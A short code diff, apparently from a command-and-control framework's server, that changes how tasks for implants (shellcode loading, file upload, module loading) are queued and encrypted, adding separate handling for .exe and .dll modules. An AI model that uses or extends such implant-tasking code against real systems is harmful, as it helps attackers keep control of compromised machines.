@@ -2,7 +2,7 @@
 
 from Colours import *
 from Core import *
-import DB 
+import DB
 
 def newTask(path):
   result = DB.get_implants_all()
@@ -26,7 +26,7 @@ def newTask(path):
             print "Loading Shellcode",Colours.END
           elif "upload-file" in command.lower():
             print "Uploading File",Colours.END
-          else: 
+          else:
             try:
               print command,Colours.END
             except Exception as e:
@@ -35,10 +35,16 @@ def newTask(path):
           if a[2].startswith("loadmodule"):
             try:
               module_name = (a[2]).replace("loadmodule ","")
-              modulestr = load_module(module_name)
+              if ".exe" in module_name:
+                modulestr = load_module_sharp(module_name)
+              elif ".dll" in module_name:
+                modulestr = load_module_sharp(module_name)
+              else:
+                modulestr = load_module(module_name)
               command = "loadmodule%s" % modulestr
             except Exception as e:
               print "Cannot find module, loadmodule is case sensitive!"
+              print e
           if commands:
             commands += "!d-3dion@LD!-d" + command
           else:
@@ -47,8 +53,6 @@ def newTask(path):
 
         if commands is not None:
           multicmd = "multicmd%s" % commands
-
-
         try:
           responseVal = encrypt(EncKey, multicmd)
         except Exception as e:
